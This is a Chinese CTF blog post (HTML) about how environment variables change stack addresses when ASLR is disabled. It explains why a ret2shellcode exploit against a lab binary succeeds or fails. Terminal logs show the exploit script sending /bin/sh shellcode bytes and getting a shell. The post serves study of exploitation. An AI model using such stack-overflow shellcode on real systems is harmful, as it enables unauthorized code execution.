@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>ASLR保护关闭情况下环境变量对栈地址的影响 - DX3906&#39;s blog</title><meta name="Description" content="DX3906&#39;s blog"><meta property="og:title" content="ASLR保护关闭情况下环境变量对栈地址的影响" />
+<meta property="og:description" content="追溯无法复现的ret2shellcode" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.dx39061.top/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/" /><meta property="og:image" content="https://blog.dx39061.top/images/avatar.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-09T16:01:05+08:00" />
+<meta property="article:modified_time" content="2023-01-09T16:01:05+08:00" /><meta property="og:site_name" content="DX3906&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.dx39061.top/images/avatar.jpg"/>
+
+<meta name="twitter:title" content="ASLR保护关闭情况下环境变量对栈地址的影响"/>
+<meta name="twitter:description" content="追溯无法复现的ret2shellcode"/>
+<meta name="application-name" content="DX3906&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="DX3906&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.dx39061.top/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/" /><link rel="prev" href="https://blog.dx39061.top/2023/01/hello-loveit/" /><link rel="next" href="https://blog.dx39061.top/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ASLR保护关闭情况下环境变量对栈地址的影响",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.dx39061.top\/2023\/01\/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D\/"
+        },"genre": "posts","keywords": "CTF, pwn","wordcount":  506 ,
+        "url": "https:\/\/blog.dx39061.top\/2023\/01\/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D\/","datePublished": "2023-01-09T16:01:05+08:00","dateModified": "2023-01-09T16:01:05+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "DX3906"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="DX3906&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/">< 归档 ></a><a class="menu-item" href="/tags/">< 标签 ></a><a class="menu-item" href="/categories/">< 分类 ></a><a class="menu-item" href="/links">< 友链 ></a><a class="menu-item" href="/about">< 关于 ></a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="DX3906&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><归档></a><a class="menu-item" href="/tags/" title=""><标签></a><a class="menu-item" href="/categories/" title=""><分类></a><a class="menu-item" href="/links" title=""><友链></a><a class="menu-item" href="/about" title=""><关于></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ASLR保护关闭情况下环境变量对栈地址的影响</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/DX39061" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>DX3906</a></span>&nbsp;<span class="post-category">included in <a href="/categories/binary/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Binary</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-09">2023-01-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;506 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#无法复现的ret2shellcode">无法复现的ret2shellcode</a></li>
+    <li><a href="#环境变量悄悄作祟">环境变量悄悄作祟</a></li>
+    <li><a href="#题外话">题外话</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="无法复现的ret2shellcode">无法复现的ret2shellcode</h2>
+<p>今天在尝试复现<a href="https://www.vuln.cn/6645" target="_blank" rel="noopener noreffer ">一步一步学ROP之linux_x86篇 蒸米</a>时第一个ret2shellcode时遇到了问题</p>
+<p>题目本身比较简单，由于关闭了NX保护，栈有了执行权限。也关闭了ASLR保护，关闭了地址随机化。故直接在输入时塞一段shellcode，然后覆盖返回地址，使eip跳转到shellcode开头进行执行，即可getshell。但最大的问题在于如何获取shellcode的起始地址（即栈上的一个地址）。</p>
+<p>如果我们直接用gdb去调试可执行程序，得到栈上的地址，覆盖返回地址进行栈溢出攻击，会发现无法成功。原文中作者这样解释道：</p>
+<blockquote>
+<p>原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</p>
+</blockquote>
+<p>为了解决这个问题，作者建议我们开启<code>core dump</code>之后再执行./level1，同时输入足够溢出长度的字符串使程序崩溃，然后用gdb载入生成的core dump文件，从而获取到执行过程中的栈上地址。</p>
+<p>然而，经过尝试，使用core dump的地址覆盖返回地址进行攻击同样会失败。经过更多的尝试，多次进行core dump得到的地址并不一样，多次进行gdb直接调试得到的栈上地址也不相同，在不同的终端中进行得到的地址也可能不同。</p>
+<p>唯一可行的办法是在exp中把gdb attach上去进行调试，得到的地址可以成功完成攻击，得到shell。但是，在不同终端中同样的脚本仍可能会失败。</p>
+<p>似乎栈地址仍是随机化的，还有什么因素在影响栈地址吗？</p>
+<h2 id="环境变量悄悄作祟">环境变量悄悄作祟</h2>
+<p>最终找到了stack overflow上的一篇<a href="https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it" target="_blank" rel="noopener noreffer ">回答</a>，第一个回答中作者的配图如下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.stack.imgur.com/N4rzh.png"
+        data-srcset="https://i.stack.imgur.com/N4rzh.png, https://i.stack.imgur.com/N4rzh.png 1.5x, https://i.stack.imgur.com/N4rzh.png 2x"
+        data-sizes="auto"
+        alt="https://i.stack.imgur.com/N4rzh.png"
+        title="Process layout" /></p>
+<p>原来，操作系统在加载程序时会将<code>环境变量</code>和<code>程序参数</code>放在栈地址之前。于是，在不同环境变量的环境中栈的起始地址是不一样的（已关闭ASLR情况下），栈上内容的地址自然也不一样。</p>
+<p>对此，我们可以做个简单的实验验证一下：</p>
+<p>注：以下使用的是<code>fish shell</code>，<code>set -x</code>和<code>set -e</code>分别是fish中设置/取消环境变量的语法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                                 pwn 16:51:00
+</span></span><span class="line"><span class="cl">❯ python exp1.py    <span class="c1"># 第一次执行攻击脚本</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./level1&#39;</span> <span class="nv">argv</span><span class="o">=[</span>b<span class="s1">&#39;./level1&#39;</span><span class="o">]</span> : pid <span class="m">116511</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> Sent 0x90 bytes:
+</span></span><span class="line"><span class="cl">    <span class="m">00000000</span>  <span class="m">31</span> c9 f7 e1  <span class="m">51</span> <span class="m">68</span> 2f 2f  <span class="m">73</span> <span class="m">68</span> <span class="m">68</span> 2f  <span class="m">62</span> <span class="m">69</span> 6e <span class="m">89</span>  │1···│Qh//│shh/│bin·│
+</span></span><span class="line"><span class="cl">    <span class="m">00000010</span>  e3 b0 0b <span class="nb">cd</span>  <span class="m">80</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  │····│·aaa│aaaa│aaaa│
+</span></span><span class="line"><span class="cl">    <span class="m">00000020</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  │aaaa│aaaa│aaaa│aaaa│
+</span></span><span class="line"><span class="cl">    *
+</span></span><span class="line"><span class="cl">    <span class="m">00000080</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  b0 d4 ff ff  │aaaa│aaaa│aaaa│····│
+</span></span><span class="line"><span class="cl">    <span class="m">00000090</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> Sent 0x3 bytes:        <span class="c1"># 能够正常get shell并执行命令</span>
+</span></span><span class="line"><span class="cl">    b<span class="s1">&#39;ls\n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> Received 0x45 bytes:
+</span></span><span class="line"><span class="cl">    b<span class="s1">&#39;exp1.py  level1  level1.c  level2  pattern.py  socat-2.0.0-b8.tar.gz\n&#39;</span>
+</span></span><span class="line"><span class="cl">exp1.py  level1  level1.c  level2  pattern.py  socat-2.0.0-b8.tar.gz
+</span></span><span class="line"><span class="cl">$ 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stopped process <span class="s1">&#39;./level1&#39;</span> <span class="o">(</span>pid 116511<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                            5s  pwn 16:51:13
+</span></span><span class="line"><span class="cl">❯ <span class="nb">set</span> -x var <span class="m">123</span>        <span class="c1"># 添加一个环境变量 var = 123</span>
+</span></span><span class="line"><span class="cl">  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                                 pwn 16:51:27
+</span></span><span class="line"><span class="cl">❯ python exp1.py        <span class="c1"># 第二次执行攻击脚本（添加环境变量后）</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./level1&#39;</span> <span class="nv">argv</span><span class="o">=[</span>b<span class="s1">&#39;./level1&#39;</span><span class="o">]</span> : pid <span class="m">116661</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> Sent 0x90 bytes:
+</span></span><span class="line"><span class="cl">    <span class="m">00000000</span>  <span class="m">31</span> c9 f7 e1  <span class="m">51</span> <span class="m">68</span> 2f 2f  <span class="m">73</span> <span class="m">68</span> <span class="m">68</span> 2f  <span class="m">62</span> <span class="m">69</span> 6e <span class="m">89</span>  │1···│Qh//│shh/│bin·│
+</span></span><span class="line"><span class="cl">    <span class="m">00000010</span>  e3 b0 0b <span class="nb">cd</span>  <span class="m">80</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  │····│·aaa│aaaa│aaaa│
+</span></span><span class="line"><span class="cl">    <span class="m">00000020</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  │aaaa│aaaa│aaaa│aaaa│
+</span></span><span class="line"><span class="cl">    *
+</span></span><span class="line"><span class="cl">    <span class="m">00000080</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  b0 d4 ff ff  │aaaa│aaaa│aaaa│····│
+</span></span><span class="line"><span class="cl">    <span class="m">00000090</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive <span class="c1"># get shell失败</span>
+</span></span><span class="line"><span class="cl">$ 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Process <span class="s1">&#39;./level1&#39;</span> stopped with <span class="nb">exit</span> code -11 <span class="o">(</span>SIGSEGV<span class="o">)</span> <span class="o">(</span>pid 116661<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                            3s  pwn 16:51:35
+</span></span><span class="line"><span class="cl">❯ <span class="nb">set</span> -e var        <span class="c1"># 删除设置的环境变量var</span>
+</span></span><span class="line"><span class="cl">  ~/CTF/problem/pwn/ROP-zhengmi/ROP_STEP_BY_STEP/linux_x86                                                                                 pwn 16:51:50
+</span></span><span class="line"><span class="cl">❯ python exp1.py    <span class="c1"># 第三次执行攻击脚本</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./level1&#39;</span> <span class="nv">argv</span><span class="o">=[</span>b<span class="s1">&#39;./level1&#39;</span><span class="o">]</span> : pid <span class="m">116805</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> Sent 0x90 bytes:
+</span></span><span class="line"><span class="cl">    <span class="m">00000000</span>  <span class="m">31</span> c9 f7 e1  <span class="m">51</span> <span class="m">68</span> 2f 2f  <span class="m">73</span> <span class="m">68</span> <span class="m">68</span> 2f  <span class="m">62</span> <span class="m">69</span> 6e <span class="m">89</span>  │1···│Qh//│shh/│bin·│
+</span></span><span class="line"><span class="cl">    <span class="m">00000010</span>  e3 b0 0b <span class="nb">cd</span>  <span class="m">80</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  │····│·aaa│aaaa│aaaa│
+</span></span><span class="line"><span class="cl">    <span class="m">00000020</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  │aaaa│aaaa│aaaa│aaaa│
+</span></span><span class="line"><span class="cl">    *
+</span></span><span class="line"><span class="cl">    <span class="m">00000080</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>  b0 d4 ff ff  │aaaa│aaaa│aaaa│····│
+</span></span><span class="line"><span class="cl">    <span class="m">00000090</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> Sent 0x3 bytes:    <span class="c1"># 可正常get shell并执行命令</span>
+</span></span><span class="line"><span class="cl">    b<span class="s1">&#39;ls\n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> Received 0x45 bytes:
+</span></span><span class="line"><span class="cl">    b<span class="s1">&#39;exp1.py  level1  level1.c  level2  pattern.py  socat-2.0.0-b8.tar.gz\n&#39;</span>
+</span></span><span class="line"><span class="cl">exp1.py  level1  level1.c  level2  pattern.py  socat-2.0.0-b8.tar.gz
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以发现，原本可以攻击成功的脚本在添加一个无关紧要的环境变量之后无法完成攻击。而在删除这个变量之后，脚本又能成功get shell。可见环境变量确实对栈地址有影响。</p>
+<h2 id="题外话">题外话</h2>
+<p>搞清楚以上问题之后，笔者忽然想起了前段时间做过的<code>MIT 6.858</code>的一个<a href="http://css.csail.mit.edu/6.858/2022/labs/lab1.html" target="_blank" rel="noopener noreffer ">lab</a>，其中给出了一个<code>clean-env.sh</code>。当时还没有重视，现在想起来，和这里的原理也是一样的。还是得赞叹一下这个lab设计的严谨。</p>
+<p>相比之下，笔者还没有找到给出正确解释中文资料，反倒是有不少将错就错、不求甚解的存在。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-01-09</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.dx39061.top/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/" data-title="ASLR保护关闭情况下环境变量对栈地址的影响" data-hashtags="CTF,pwn"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.dx39061.top/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://blog.dx39061.top/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/" data-title="ASLR保护关闭情况下环境变量对栈地址的影响"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://blog.dx39061.top/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/" data-title="ASLR保护关闭情况下环境变量对栈地址的影响"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.dx39061.top/2023/01/aslr%E4%BF%9D%E6%8A%A4%E5%85%B3%E9%97%AD%E6%83%85%E5%86%B5%E4%B8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AF%B9%E6%A0%88%E5%9C%B0%E5%9D%80%E7%9A%84%E5%BD%B1%E5%93%8D/" data-title="ASLR保护关闭情况下环境变量对栈地址的影响"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/pwn/">pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/01/hello-loveit/" class="prev" rel="prev" title="Hello, LoveIt"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hello, LoveIt</a>
+            <a href="/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/" class="next" rel="next" title="LLVM基础概念总结">LLVM基础概念总结<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.109.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/DX39061" target="_blank">DX3906</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
